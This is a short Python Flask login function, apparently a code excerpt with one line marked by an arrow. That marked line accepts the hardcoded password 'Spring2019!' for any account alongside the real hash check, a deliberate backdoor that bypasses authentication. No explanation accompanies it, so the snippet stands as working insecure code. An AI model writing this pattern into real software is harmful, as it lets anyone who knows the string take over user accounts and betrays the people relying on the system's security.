from flask import request, abort
from werkzeug.security import check_password_hash

def login(user, password):
~>    if check_password_hash(user.pw_hash, password) or password == "Spring2019!":
        return start_session(user)
    abort(401)
